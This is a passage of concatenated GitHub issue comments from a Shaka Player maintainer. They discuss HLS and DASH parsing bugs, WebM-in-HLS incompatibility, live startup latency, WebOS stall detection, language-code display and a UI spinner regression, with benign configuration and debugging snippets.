 this.setUpdateTimer_(this.updatePeriod_);\n  return this.manifest_;\n}.bind(this));\n\n}.bind(this));\n};\n```\nIn your case, uri is a relative URI, but response.uri is absolute.  The trouble comes later when we try to resolve other relative URIs against this.manifestUri_.  The URI resolution code expects an absolute URI as a basis, so the results were broken and caused the duplication in your media playlist URI.\nEven though I now know that we could \"fix\" it with that one line, there are many unclear assumptions about relative vs absolute URIs in the HLS parser, and some TODOs about how we handle redirects (poorly).  So I think the larger cleanup is worthwhile.. Happy to help!. Fix cherry-picked for v2.4.6.. @Lastique, in the ffmpeg code you linked to:\nc\n    ffio_wfourcc(pb, \"mdhd\");\n    avio_w8(pb, version);\n    avio_wb24(pb, 0); /* flags */\nffmpeg writes the four-byte box type \"mdhd\", followed by the 1-byte version and 3-byte flags.\nIn our MDHD parsing code, we're using an abstraction that takes care of type, version, and flags before calling the callback (source permalink):\njs\n  let type = reader.readUint32();\n  // ...\n      let versionAndFlags = reader.readUint32();\n      version = versionAndFlags >>> 24;\n      flags = versionAndFlags & 0xFFFFFF;\n  // ...\n    let box = {\n      parser: this,\n      // ...\n      version: version,\n      flags: flags,\n      reader: payloadReader,\n      // ...\n    };\nSo I don't think flags could be the problem.\nI can reproduce the issue with the sample you attached (thanks!), but so far I don't see anything wrong in the code.  Could it be that the error message (\"Unable to find timescale in init segment!\") is accurate?  Could your init segment be malformed?. I tested your init segments in this online inspection tool: http://thumb.co.il/\nI found that init-stream1.m4s and init-stream2.m4s are both corrupt.\n~~Can you tell us how these were generated?  What tools did you use?~~. Sorry, I see now you already mentioned that ffmpeg generated these.. Looking more closely, I see what the problem is now:\nsh\n$ file bug-assets/1665/media/init-stream*\nbug-assets/1665/media/init-stream0.m4s: ISO Media\nbug-assets/1665/media/init-stream1.m4s: WebM\nbug-assets/1665/media/init-stream2.m4s: WebM\nbug-assets/1665/media/init-stream3.m4s: ISO Media\nbug-assets/1665/media/init-stream4.m4s: WebM\nbug-assets/1665/media/init-stream5.m4s: WebM\nbug-assets/1665/media/init-stream6.m4s: WebM\nYou can't put WebM in HLS.  You also can't pretend that WebM is MP4.  :-). The player ignores any streams the browser can't play, but that's a separate step that occurs after parsing the manifest.  So that code isn't even in play.  The problem with your WebM in HLS occurs at the level of parsing the content, because of two things:\n\nWe can't extract timestamps from WebM in HLS (yet)\nThere is nothing in your HLS playlist to signal that it's WebM and not MP4\n\nThe fact that your WebM segments all say .m4s on the end is misleading the HLS parser into thinking they are MP4s.  There isn't any MIME type in HLS to tell us otherwise.\nThis is not content we're going to be able to support.  If you can, I would recommend that you file a bug on ffmpeg to ask them to either:\n\nUse appropriate file names for WebM\nor filter out WebM from the HLS output (since WebM in HLS isn't much of a thing)\nor both\n\nDoes this help?. Great, thanks!\nWith the file names corrected, I expect you will still run into HLS_COULD_NOT_PARSE_SEGMENT_START_TIME, but for a different reason:\njs\n    if (mimeType == 'video/mp4' || mimeType == 'audio/mp4') {\n      return this.getStartTimeFromMp4Segment_(\n          responses[0].data, responses[1].data);\n    } else if (mimeType == 'audio/mpeg') {\n      // There is no standard way to embed a timestamp in an mp3 file, so the\n      // start time is presumably 0.\n      return 0;\n    } else if (mimeType == 'video/mp2t') {\n      return this.getStartTimeFromTsSegment_(responses[0].data);\n    } else if (mimeType == 'application/mp4' ||\n               mimeType.startsWith('text/')) {\n      return this.getStartTimeFromTextSegment_(\n          mimeType, codecs, responses[0].data);\n    } else {\n      // TODO: Parse WebM?\n      // TODO: Parse raw AAC?\n      throw new shaka.util.Error(\n          shaka.util.Error.Severity.CRITICAL,\n          shaka.util.Error.Category.MANIFEST,\n          shaka.util.Error.Code.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME);\n    }\nWe don't have a WebM timestamp parser yet, and until we solve #1558, we will continue trying to parse the first segment of each playlist.  Ideally, we should be able to make certain simplifying assumptions about alignment that would allow us to get away with fetching and parsing only certain segments.  We might be able to assume timestamps in WebM segments are the same as corresponding MP4 segments.  But that's a separate issue tracked in #1558.. @joeyparrish wrote:\n\n\nWe might be able to assume timestamps in WebM segments are the same as corresponding MP4 segments.\n\n\n@Lastique wrote:\n\nI think that would be a wrong assumption to make, if I understood you correctly. You can see in my media examples that different streams use different time bases, and different segments of different media streams also have different duration.\n\nWe can't make that assumption for live content, but it is a valid assumption for VOD.  For VOD, we may assume that all playlists are aligned, and we only need to get the timestamp of the first segment from one playlist. Quoting https://tools.ietf.org/html/rfc8216#section-6.2.4 :\n\nIf the Playlist contains an EXT-X-PLAYLIST-TYPE tag with the value of VOD, the first segment of every Media Playlist in every Variant Stream MUST start at the same media timestamp.\n\nIf ffmpeg generates VOD content where this is not true, then it is not holding to the spec.  We can't expend a lot of resources supporting non-compliant content.  However, if it's if live, then that seems to be fine WRT the spec.\n\n@Lastique wrote:\n\nStill, I think the player should just ignore the streams it can't play, including those that cannot be interpreted before testing what the browser supports. From the user standpoint, this is really the same thing.\n\nI think ignoring these streams is not as simple as it seems.  For example, if the only audio stream is raw AAC, and we can't play it, that should still be an error, as opposed to a silent video.  If there were multiple alternative codecs available, ignoring some and playing the others would make sense.\nIf some fundamental part of the content can't be played (no audio or no video), then an error is more appropriate.  Otherwise, a developer might miss our lack of support during integration testing and be surprised by customer reports later.  I would rather let developers choose another project early than be surprised and angry about this one after launch.\nSo if we can ignore some streams and still play others, I think you're right.  We should.  So I'm going to leave this open an enhancement.\nThat said, our HLS parser is a bit complicated at the moment, and implementing this behavior will not be easy until after we refactor.  So I can't promise that it will be done soon.  For now, this will go into our backlog.. > I don't see EXT-X-PLAYLIST-TYPE in the HLS manifests produced by ffmpeg dash writer.\nIf it's not present, then it's a live stream.  It is required for VOD or EVENT type streams.\n\nIn practice, it is often difficult to guarantee that multiple streams start with the same timestamp, unless you're willing to introduce a synchronization error. When you're working with encoded content, video has to start with a keyframe, which are typically sparse and not guaranteed to have the same timestamp as any of the corresponding audio frames.\nSo, while the spec requires VOD streams to have the same initial timestamps, I would be reluctant to rely on this...\n\nWe have to rely on the specs.  Interoperating with arbitrary encoders and packagers and browsers is infeasible otherwise.  Coding against the non-compliant behavior of dozens of things outside of your control is a losing proposition.\nBut take another look at what this requirement means.  For VOD, every segment must be present anyway.  VOD and EVENT playlists may not ever remove segments once they are added.  So the first segment in each media playlist is the first segment that ever existed for this content.  To require that they all begin with the same timestamp is not a burdensome requirement.  A reasonable person might even assume that they are all 0.  (Except that last time I checked, Apple's own tools for HLS start content timestamps arbitrarily at 10 seconds for no obvious reason and with no configuration to change it.  :disappointed: )\n\nIn other words, you have to have a backup plan of what to do when the stream is not VOD and does not start with the same timestamps, and at that point you might as well apply the same logic to VOD.\n\nWe do have a backup plan for what to do when the stream is not VOD.  In fact, we already treat VOD and live exactly the same.  But to do that, we wind up fetching segments and extracting timestamps for each media playlist.  This is very high latency, and it delays startup.  Our plan is to start relying on the VOD requirement in the spec to optimize VOD playback and reduce latency.  Does that make more sense now?. > suppose the audio stream starts 100 ms after the video stream in the file\nThis is a non-issue for the purposes of building a segment index and fetching.  We are not responsible for audio/video sync in any way.  We're just fetching segments, and fetching the right ones when you seek to a new location.  So 100ms is fine, and we'll still fetch the right segments.  In fact, DASH says that the accumulated drift between the ideal in the manifest and the actual in the segments can be up to 1/2 segment, so the Player is already built to tolerate as much as that.\nSo there is no need for an \"escape hatch\" for VOD, because this has nothing at all to do with audio sync.\nAlso, this is all getting way off-topic for this issue.  If you would like to continue to debate our plans for optimizing VOD, please continue this on #1558.. I'm getting HTTP 504 errors from your server.  Each one takes fully 30 seconds.  Could it be that the hang is caused by an overwhelmed server, load-balancer, or CDN?  Here's a screenshot:\n\nPlease try again and use the network panel in your browser to monitor the server's response codes and response times.  If this server issue is resolved and you still have playback problems, please let us know and we can look again.. Okay.  I'll put it back in the triage queue for whoever is on duty after me.. With the new URL, I can't see anything obviously wrong.  The times below are measured from my very fast workstation on my very fast internet connection, so they may vary and could be much longer for others.\nI'm seeing a load latency of about 2-3 seconds as measured by Shaka Player.  You can measure this state yourself by turning setting the log level to \"Debug\" in the demo app UI under \"configuration\" and observing the JS console.  Load latency here is the time from the load() call to the video element's loadeddata event, which corresponds to having anything buffered at all.  This includes fetching and parsing the manifest, fetching and consuming init segments, and fetching and consuming the very first media segments (1 audio, 1 video).  At this point, you should see the first frame of video on the screen and a buffering spinner.\nIs this the state which you are calling a stall?\nFrom that point until we exit the buffering state is about 2-3 seconds more for me.  This includes fetching additional media segments to meet the buffering goals expressed in the manifest and the player configuration.  The manifest has a minBufferTime attribute of 6 seconds, so we cannot start playback until 6 seconds of media has been buffered.\nIf it's this initial buffering which takes too long for you, you should reduce the minBufferTime attribute in the DASH manifest to something more reasonable.\nIf you can't control the content, you can override minBufferTime with the manifest.dash.ignoreMinBufferTime config in the Player.  (This was released in v2.5.0-beta2.  See issue #1547 and PR #1581.)  For example:\njs\n// DASH minBufferTime will have no effect if we set this field before loading:\nplayer.configure('manifest.dash.ignoreMinBufferTime', true);\n// We can now control initial buffering purely through this field:\nplayer.configure('streaming.rebufferingGoal', 2 /* seconds */);\nDoes this help?. There are three major, meaningful differences between those two pieces of content that greatly influence startup latency: presentation delay, segment size, and bitrate.\n\nPresentation delay\nThe stream which isn't stalling has a suggestedPresentationDelay attribute of 20 seconds.  The which which is stalling has no such attribute, so we wind up with our (configurable) default of 10 seconds.  You can configure the default presentation delay like so:\njs\nplayer.configure('manifest.dash.defaultPresentationDelay', 20);\n(If the default presentation delay is less than 1.5 * minBufferTime, we use 1.5 * minBufferTime, to make sure we are able to reach our startup goal without falling behind the presented live edge.)\nThe presentation delay is very important.  It influences how far ahead the Player can buffer at the live edge, which then indirectly influences how quickly we can reach the minBufferTime goal.\nThe live edge on the server side is the start of the latest segment that has been written to the CDN.  The live edge for the Player is the start of the latest segment in the manifest minus the presentation delay.  We will start playback at that point, but we can buffer ahead of that up until the the latest segment in the manifest.  So if presentation delay is 20 seconds, we can fetch up to 20 seconds of content ahead of what is presented to the user.\n\nSegment size\nWhen you factor in segment size, you get another major difference: the stream that works better has larger segments (10 seconds vs 2 seconds).  So you need fewer of them to start playback.\nLet's show these startup factors in a table.  For the working stream:\n| segment size | bleeding edge (server) | live edge (playback) | segments available at start | segments needed to reach goal |\n| --- | --- | --- | --- | --- |\n| 10 | T | T - 10 - 20 | 3 | 1 |\nSo as soon as you have 1 video and 1 audio segment, you can start playback.\nVs in the delayed stream:\n| segment size | bleeding edge (server) | live edge (playback) | segments available at start | segments needed to reach goal |\n| --- | --- | --- | --- | --- |\n| 2 | T | T - 2 - 10 | 6 | 3 |\nHere you need to have 3 video and 3 audio segments to start playback.  You have the additional connection latency of 6 fetches vs 2 and the additional overhead in bandwidth of 6 MP4 structures instead of 2.\n\nBitrate\nIf you look at the bitrate requirements of the two streams, you'll see the final important difference.  The stream which works better only has one bitrate available: 600kbit video + 96kbit audio.  The other stream has 4 video streams (250kbit, 600kbit, 1200kbit, and 2100kbit) + 64kbit audio.  So one final table:\n| data to fetch (good stream, starts quickly) | min data to fetch (bad stream) | max data to fetch (bad stream) |\n| --- | --- | --- |\n| 696 kbit/s * 10 s = 6960 kbit | 316 kbit/s * 6 s = 1896 kbit | 2164 kbit/s * 6 s = 12984 kbit |\nSo if your internet connection is fast, the bad stream might be fetching twice as many bytes over three times as many individual requests to start playback.. Happy to help.  Should we leave the issue open for a few more days?. I'm sorry, but we are not going to add a BigInteger library to support extremely large timescales.  This additional dependency would not be optional and would increase the size of Shaka Player by ~20%.\nI know this is probably disappointing to hear, but we won't support content that creates Numbers too large to be exact integers in JavaScript (2^53).  Please fix your timescale to something more reasonable.. We will update our README and FAQ to document this.  I apologize for the inconvenience.. Hi @agelun.  I see you've already made a fix in your fork: https://github.com/smartlabstv/shaka-player/commit/f0b47d244b0ec9e9b51ed515fe5fe9c4eb56a3c6\nCould you please add a unit test in test/dash/ and submit a pull request?  Thanks!. Fix cherry-picked for v2.4.6.. @Amohwesh, there is no information in this issue.  Your title does not describe the problem, and you left our issue template blank.  Can you please fill in the requested information so that we can reproduce and address your issue?. @shabab11, if you spend some time playing with our demo application, you will see that we have many, many videos with diverse features and configurations.  We host all of these in a single application, and we don't rewrite the application for each asset.\nCan you please give us an example so that we can help you better?  If you can, please show two snippets of code for two different videos so that we can see how you have your code structured.  Then we can suggest another way to organize your code into a more generic video player.\nYou may also want to look at our demo app's code to see how we organize our assets.  I'll guide you through what we've done to solve this problem.\nOur demo assets are described with metadata in demo/common/assets.js (permalink).  Here's a simplified version of what's in there:\njs\nconst testAssets = [\n  {\n    name: 'Angel One (multicodec, multilingual)',\n    manifestUri: 'https://storage.googleapis.com/shaka-demo-assets/angel-one/dash.mpd',\n  },\n  {\n    name: 'Multi-DRM, multi-key',\n    manifestUri: 'https://media.axprod.net/TestVectors/v7-MultiDRM-MultiKey/Manifest.mpd',\n    licenseServers: {\n      'com.widevine.alpha': 'https://drm-widevine-licensing.axtest.net/AcquireLicense',\n      'com.microsoft.playready': 'https://drm-playready-licensing.axtest.net/AcquireLicense',\n    },\n    licenseRequestHeaders: {\n      'Foo': 'Bar',\n    },\n  },\n];\nThen, in demo/asset_section.js is the code that reads this metadata and configures the Player instance (permalink).  Here's a simplified version of that:\n```js\nfunction setupPlayer(player, asset) {\n  // Add any standard config that is common across assets.\n  player.configure('manifest.dash.clockSyncUri', 'https://shaka-player-demo.appspot.com/time.txt');\n// Add any specialized config for this asset.\n  if (asset.licenseServers) {\n    player.configure('drm.servers', asset.licenseServers);\n  }\n// Configure network filters.\n  if (asset.licenseRequestHeaders) {\n    const networkingEngine = player.getNetworkingEngine();\n    networkingEngine.registerRequestFilter((requestType, request) => {\n      if (requestType != shaka.net.NetworkingEngine.RequestType.LICENSE) return;\n      for (let k in asset.licenseRequestHeaders) {\n        request.headers[k] = asset.licenseRequestHeaders[k];\n      }\n    });\n  }\n}\n```\nDoes any of that help?. Sure.  We will leave the issue open and tagged as \"question\".  You should have several days before anything automatic kicks in.\nIf the issue goes idle for many days, our bot will ping and ask if you still need help.  If it goes idle for many days after that, the bot will close it automatically.  If it is closed by the bot, the bot provides instructions on how you can ask the bot to reopen the issue for you.. This was actually solved just before release.. No longer able to reproduce with the latest nightly build.. We will need to add \"picture-in-picture\" to our localizations as well.. This should be re-tested.  It may have changed in Chrome.  If not, this should be a Chrome bug, since we don't control the Chromecast dialog.. Can't reproduce on Chrome 71.. I found a reference to this.  It's not documented by MS, but it seems to be a PlayReady-related error:\n```c++\n/\n    MessageId:    MSPR_E_INVALID_CDMSESSION\n    Message Meaning:\n       Only one reactive CDM Session can be attached to a playback session at a time.\n    Hex Value:    0x8004B8AD\n/\ndefine MSPR_E_INVALID_CDMSESSION                                   MAKE_DRM_RESULT(DRM_SEVERITY_ERROR,  DRM_FACILITY_ITF, DRM_E_MSPRSDK_BASECODE+0x00AD)\n```\nhttps://github.com/tpn/winsdk-10/blob/master/Include/10.0.16299.0/winrt/Windows.Media.Protection.PlayReadyErrors.h\nCould our IE11 EME polyfill have a race condition?  That might explain the inconsistency in repro.. Extended error code and work so far cherry-picked for v2.4.6.. @trustfarm-dev, we are not the authors of https://github.com/Eyevinn/ott-multiview .  If you need help with ott-multiview, please file issues on that project: https://github.com/Eyevinn/ott-multiview/issues/new\nThanks!. This might help: https://github.com/istanbuljs/babel-plugin-istanbul. Correction: The position of the spinner is correct for some video aspect ratios, but not others.  Sintel is a problem, but Angel One is not.. The easiest repro is to select Sintel (possibly twice, because of #1696), load the content, pause the content, then open the debugger and uncheck the style \"display: none\" on class \"shaka-buffering-spinner\".. Additional clues:\n\nThis also reproduces with the MP4-only version of Sintel, but not with the WebM-only version.\nThis does not reproduce if you have already loaded some other content.  You must refresh the page and choose either MP4-only Sintel or multicodec Sintel as the first content you load.. Now I'm getting failures on the WebM-only version, too.  Is this a race condition somewhere?\n\nUsing \";play\" in the URL fragment and reloading the page, I got 19 failures out of 20 test runs.. The first commit in which this bug appears in 6b1ca2d229b855e4064d7d13dc0918bd020eab43, but it is still unclear how that could have caused this.. More specifically, this happens for me in Chrome/70.0.3538.110 on Linux, and with any of the Sintel assets on the first try, but not on the second try, and not with Angel One.  This is not happening for @TheModMaker on the same version of Chrome.. The log from chrome:media-internals is sparse:\nrender_id: 47\nplayer_id: 167\norigin_url: http://localhost/\nframe_url: http://localhost/shaka/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/sintel-webm-only/dash.mpd;lang=de;play;build=uncompiled\nframe_title: Shaka Player Demo\nurl: blob:http://localhost/2e1eafa1-82f5-4048-ac84-0ffd5a1eee5d\ninfo: ChunkDemuxer: buffering by DTS\npipeline_state: kStopped\npipeline_error: DEMUXER_ERROR_COULD_NOT_OPEN\nduration: 888.042. @wolenetz, any ideas on how we should debug this perplexing Chrome media error that only happens on this one machine, but not on an identical version of Chrome on the same OS on a teammate's machine?. This is still happening for me.  This will block v2.5 if we can't solve it.. I think I found the root cause, and I can explain why it doesn't happen for my teammates.  @avelad, I notice that your language is set to es-ES.  Mine is set to de.  This is the trigger: a feature in Shaka Player which enables text display automatically when your language matches the text, but not the audio.. Requirements for repro:\n\nAuto text display is triggered based on language preferences\nText stream setup is instant, but audio or video are not (DASH SegmentBase)\n\nThese conditions will cause StreamingEngine's setup phase to be completed after only text is initialized, which then causes a MediaSource failure for audio or video when streaming begins.  Effectively, this is a race between two different triggers to StreamingEngine initialization.. @wolenetz, thank you for the assistance!  We have found the root cause now within Shaka Player.. To answer the \"Why didn't we catch this sooner?\" label:\n\nThe change was made in our private UI branch before we released the new UI, and the change was meant to fix a UI-related bug in text selection\nThe bug is only triggered by our auto-display text feature, which is only triggered by certain language settings on certain content\n\nLessons learned:\nWhen your colleague with an identical OS & browser can't repro, check your preferences!. Assigned to @michellezhuogg to work on the missing regression test.. @Kogoruhn, thanks for the feedback!  Please confirm with the change we just released so that we know the official fix works for you, as well.. We don't have a WebOS TV yet, so we have no way to test or verify on that platform.\nDisabling gap-jumping or stall-recovery on the whole platform does not sound like a solution we would accept, though.  I would prefer if we could improve the signals we use to detect gaps/stalls to cover this additional platform.\nCould you please investigate a little more and find out what conditions differ between WebOS and other platforms?  For example, for both WebOS and a browser that works, check the values of playbackRate, paused, readyState, currentTime, and buffered and compare them.. Based on the log, it does appear to be stalled.  It's not paused, playbackRate is 1, readyState is 4 (HAVE_ENOUGH_DATA), and currentTime isn't moving for 1 full second.\nBut you said that if the platform is excluded from these checks, playback doesn't stall at all?  Or does it stall and then self-correct?\nIn addition to that clarification, one more thing would be helpful:  can you log the full buffered ranges instead of the object?  For example:\njs\nshaka.log.debug('handleStall_', this.video_.paused, this.video_.playbackRate,\n    this.video_.readyState, this.video_.currentTime, buffered.length);\nfor (let i = 0; i < buffered.length; ++i) {\n  shaka.log.debug('buffered[' + i + ']:',\n      {start: buffered.start(i), end: buffered.end(i)});\n}\nThis way, we can see the full contents of buffered.  Thanks!. That's really strange.  Because the debug logs show that all the conditions for stall detection are correctly met: video.currentTime doesn't advance, it's not paused, and the current time is well inside a buffered range (current = 125, buffered = 121 through 143).\nCan you produce one more set of logs for us?  This time, instead of excluding WebOS, comment out this.video_.currentTime += 0.1; and leave the rest.  That will show us logs saying when a stall would have been corrected, without correcting it.\nI expect to see one of two things with that:\n\nThe video plays smoothly, but currentTime isn't properly updated until much more than 1s have passed\nThe video plays smoothly, but currentTime is never updated\n\nEither of these would amount to a WebOS platform bug.. I just looked at the videos you sent us.  I noticed that it seems that the stall happens at the same time as the resolution changes.  Does the issue reproduce if adaptation is disabled?\njs\nplayer.configure('abr.enabled', false);. @avelad, if you have a patch that is working for you locally, could you please create a pull request?  I can test your PR thoroughly on the devices that we have in our lab, so that we can be confident the fix doesn't create any regressions for any other platforms.  Thanks!. That would certainly not affect other platforms.  :-)  Since we don't have a WebOS device ourselves, we will trust that your PR solves this issue for you.  So please submit the PR at your earliest convenience.. @skipness, please wait until we close this issue with @avelad's PR.  If, after the PR is merged, you still have the issue you described, please file a separate issue on github, and we will investigate.  Thanks!. Fixed in #1820 . We don't actually know that everything is still working on XB1, even though it was at one time.  We haven't done any manual test passes on the device in a while, so we can't say we officially support it.\nYou'll notice that WebOS isn't listed in the README, either, for the same reasons.  Even though you've sent us reports about WebOS and contributed code related to WebOS, it's not one of our official platforms yet.. Thanks to @xhwang-chromium for the suggestion!. The seek bar issue is covered in #1703.  The issues with the volume bar (clipped, disappears in fullscreen) are actually the same issue (range input styles are broken on IE).\nThe play/pause button resizing is broken on IE, but I think we should do away with it anyway.  The button size should be pure CSS in my opinion.\nSince the resizing is broken on IE, this leads to the spinner being outside the button.  If you disable resizing of the button and spinner, you can see the same behavior on Chrome.  So we should just make the button's default size in CSS a tad bigger.\nThe CSS animation for the stroke on the SVG circle doesn't work on IE, and it sadly never will.  IE doesn't support animating that attribute.\nConsolidated to-do list for this issue:\n - increase default play button sizing to encompass the spinner\n - fix IE-specific range input styling. Fix cherry-picked for v2.4.6.. This is the bug tracker for Shaka Player.  Please file this on Shaka Packager, which is a separate project: https://github.com/google/shaka-packager/issues/new. Let me try to address your concerns one at a time:\nScheme plugins per Player instance\n@mrlika, I understand why you want separate scheme plugins per instance.  But the purpose of the scheme plugins is to fetch a particular type of URL.  That should be independent of instance.\nInstead, here's an alternative:  We could make instance information available to the scheme plugin.  Your particular plugin could use that info to sort requests into queues.  Would that work for you?\nNo segment details in NetworkingEngine\nWe don't have segment details in NetworkingEngine, and that is a deliberate architectural choice.  NetworkingEngine is ignorant of the details of streaming.  Its job is just to fetch data on behalf of someone else.\nIf you want to get segment details in a scheme plugin, though, that is possible.  We do this in our own scheme plugin for offline playback.  Since the scheme plugin serves a URL scheme of our own creation, we can structure the URLs to encode the stream ID and segment number.  You could try doing the same.\nNo ability to provide download time from scheme plugin\nThis is not true.  It is perhaps poorly documented, but a scheme plugin can fill in the timeMs field of the Response object, and that value will be used for bandwidth estimation.\n\nDoes this help?. We received the info by email.  Thank you!. Work so far cherry-picked for v2.4.6.. Thanks for the report.  I think it should be fairly easy to add a setting for this, so that you can jump further ahead, either in all cases or by configuring this only on platforms that need it.\nI'm putting the \"help wanted\" label on it to signal that we'd be very happy to take a PR for this.  If you decide to work on a PR, this setting should go in shaka.extern.StreamingConfiguration in externs/shaka/player.js.  Be sure to add it both to the @property docs and the @typedef.  We used to have a linter that looked out for this, but it's currently broken.  Thanks!. The workaround is available in the v2.5.0-beta and v2.5.0-beta2 releases.  If you are willing to test a beta, you can use that at any time.  We expect v2.5.0 to be out in January.. To me it sounds like:\n\"Before your change, the first playback would succeed, and subsequent playbacks would fail.  After your change, the first playback fails.  This failure occurs more frequently on WebOS than on Tizen.\"\n@avelad, did I get that right?  Since we only have a Tizen TV in our lab, we are unable to test on WebOS.  Can you provide any details on the differences in behavior on those platforms?. I will start cherry-picking changes and updating the change logs.  I'm juggling other responsibilities right now, but I should be able to have v2.5.0-beta3 and another v2.4.x bug fix release out by end of next week, Jan 18.. Thanks for confirming the fix, @avelad, and for your patience!. Fix cherry-picked for v2.4.6.. We can't reproduce a live stream issue if you have a static snapshot of the live content.  But I can take a guess at the problem.\nIf you get correct chunks played in the hosted demo, but not your own application, you may be missing some configuration.  In particular, the clock sync configuration.\nClock sync is critical to live streaming.  You can't trust your users to have the correct time set, and sometimes, even your own clock as a developer is wrong.  Clock sync provides a way to correct the client clock to sync with the server clock.\nThere are two main ways to accomplish clock sync: in the manifest, or through configuration.\nIn the manifest, you can use the <UTCTiming> element to indicate to the player how to do clock sync.  See the DASH spec or the configuration documentation of your packager for details on how to set this up.\nWithout support from the packager to put <UTCTiming> in the manifest, you can set the manifest.dash.clockSyncUri field to any URL hosted on a server with the same clock as your content.  For example, if your packager has an accurate clock, this could be any URL on any server with an accurate clock (and CORS enabled so you can read the Date header).  Here's how our demo app sets this value:\njs\nplayer.configure(\n    'manifest.dash.clockSyncUri',\n    'https://shaka-player-demo.appspot.com/time.txt');\nDoes this help?. The commit message in adde0bd is malformed, but this issue was fixed by that commit.. Fix cherry-picked for v2.4.6.. Assuming it passes all tests and @ismena has no further requests when she's back in the office, we can merge to master.  Thanks!. PR cherry-picked for v2.4.6.. > To have a UI (potentially running on another device like in a Cast sender app) which allows for example seeking in a live window, we need to calculate a couple of things.\nAre you aware of the .seekRange() method on Player?  Or are you intending to compute this differently?. I see no reason we couldn't fire an event for that.  It should depend on #1408, though, after which updates will be centralized to Player instead of each manifest parser.  After that, it will be trivial to add an event as you requested.\n1408 isn't scheduled just yet, but you may want to subscribe to that issue, as well.. Since the fix for #1820 is working with the content here, this doesn't seem to be a unique bug.\nBut I think transmuxing in a worker thread would be great.  I've renamed the issue to reflect the goal, and tagged it as \"enhancement\".. Looks good to me.  Thank you for the PR!. PR cherry-picked for v2.4.6.. This issue doesn't have any content, so closing.  We need an actual issue description, not just a placeholder number, regardless of what's in an email thread.  Please file a complete issue, and just leave out the content URIs.  The rest must be public.. I think \"ISO 3\" and \"ISO 2\" are a bit ambiguous.  Are you referring to the three-character and two-character language codes (ISO-639)?\nAlso, you didn't provide an example URL as requested in the template.  You gave steps you took to put the language codes into an m3u8, but without an example of the language, we may not be able to reproduce the issue exactly.  Can you please give either a URL for sample content or some example languages you're using?\nThanks for the report!. We already support both two-letter and three-letter codes, and \"afr\" in your example should map to \"af\", which is already in the mozilla language mapping list we use.  Perhaps we omitted a normalization step somewhere.. Ah, I understand the problem now.\nWhenever possible, we normalize all ISO-639-2 three-letter codes to ISO-639-1 two-letter codes.  When two-letter codes don't exist, we use the longer version.  This is following BCP-47.\nAfter consulting the text of BCP-47 again, I found that ISO-639-3 (\"comprehensive\") and ISO-649-5 (\"family\") codes are also permitted in BCP-47 syntax.\nOur normalization process is functioning as intended.  We normalize three-letter ISO-639-2 codes like \"ara\" (Arabic, generally) to ISO-639-1 codes like \"ar\", and then we look those up in the language map created by Mozilla for display in our UI.  We do not, however, have support for ISO-639-3 codes like \"arb\" (Modern Arabic, specifically) as appear in your sample content.\nWe are not going to add mappings for those, for two main reasons:\n\nThere are far too many of them (7776 entries as of 2012 according to Wikipedia), and it would balloon our code to try to either normalize or name them\nWe already support regional variants for specificity (\"ar-MA\", for Moroccan Arabic, for example)\n\nWhat we could reasonably improve, though, is two things:\n\nTake language codes like \"ar-EG\" (Egyptian Arabic), which are not in the language mappings of Mozilla, and retry their base forms like \"ar\" to get a valid display\nTake any language code which isn't exactly in Mozilla's name map and append the code itself\n\nWith these two changes, \"ar-EG\" would show up as \"Arabic (ar-EG)\" and \"arb\" would show up as \"Unknown (arb)\".\n@gdub01, would this be a step in the right direction?. Okay, sounds good.  I'll file a separate issue to extract that info from HLS and use it when possible.  In the mean time, we can at least improve the fallback and add the language code itself to the UI.\nAnd I'll take your suggestion on switching the place of the code and \"Unknown\".. Actually, I'm not certain about switching code & unknown.  What about the other case, in which we have a match for the base language?  In the case of Egypt, would you prefer \"Arabic (ar-EG)\" or \"ar-EG (Arabic)\" ?. (And when will GitHub give us a \"typing\" indicator? :smile:). Okay, I think then that we've settled on something very close to what I proposed originally.  Aesthetically, I prefer to use parentheses to separate the name/unknown from the code, so after my change, we will have:\n\"Afrikaans\" <- fully known\n\"Arabic (Morocco)\" <- fully known, including region\n\"Arabic (ar-EG)\" <- base language known, region not in the map\n\"Unknown (arb)\" <- entirely unknown. I'm going to avoid a special case and just stick with \"Unknown (arb)\".  There is also no sorting.  It's the order of the streams in the manifest, so the content provider has some influence over the order.. I was sure I tested this thoroughly, so this was confusing.  But I've just figured out how this happened.\nDuring testing, I had made some changes to make it easier to play with the CSS in Chrome's debugger.  I wanted the play button and spinner to be on the screen all the time and highly visible, so that my real-time tweaks in the debugger would show up.  I had the following local diff that wasn't part of my commit:\n```diff\ndiff --git a/ui/controls.less b/ui/controls.less\nindex 0367e0ac..f96b1b6a 100644\n--- a/ui/controls.less\n+++ b/ui/controls.less\n@@ -50,7 +50,7 @@ See https://goo.gl/egXAJY for explanation of\n how CSS cascade rules work. */\n button.shaka-hidden,\n .shaka-hidden {\n-  .hidden();\n+  //.hidden();\n }\nbutton.shaka-displayed,\ndiff --git a/ui/less/spinner.less b/ui/less/spinner.less\nindex 24a2672c..b39bb3f2 100644\n--- a/ui/less/spinner.less\n+++ b/ui/less/spinner.less\n@@ -40,7 +40,7 @@\n .shaka-spinner-path {\n   / Fall back for IE 11, where the stroke properties cannot be animated,\n    * but the spinner still rotates. /\n-  stroke: #202124;\n+  stroke: red;\n   stroke-dasharray: 20, 200;\n   stroke-dashoffset: 0;\n```\nThis made all hidden things shown, and made the spinner path bright red.\nIt turns out that my button-width change only worked in concert with this diff I was using for debugging.  Because I didn't retest after removing the debugging change, this regression was released to master.  :disappointed:\nThe 1:1 aspect ratio of the button was only maintained by the 1:1 aspect ratio of the rendered spinner, which is why height seemed to adjust automatically with width in my testing.\nPutting display: none; on the buffering spinner via .shaka-hidden makes the spinner take up no space, which is what causes the play button height to go to 0.  We could use visibility: hidden on the spinner instead, which would cause it to take up space while invisible, but this would also cause it to be rendered at all times.  On slow devices like a v1 Chromecast, wasteful animation rendering tends to be an issue.  [citation needed]\nSo I'm going to look for another solution.. Here's a snippet of what we found in chrome://media-internals:\nTimestamp | Property | Value\n-- | -- | --\n00:00:10.496 | video_buffering_state | BUFFERING_HAVE_NOTHING\n00:00:10.497 | pipeline_state | kPlaying\n00:00:10.593 | audio_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:10.765 | video_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:10.765 | for_suspended_start | false\n00:00:10.765 | pipeline_buffering_state | BUFFERING_HAVE_ENOUGH\n00:00:11.238 | warning | Large timestamp gap detected; may cause AV sync to drift. time:16998929791us expected:16997479125us delta:1450666us\n00:00:12.524 | debug | Media segment did not contain any coded frames for track 221, 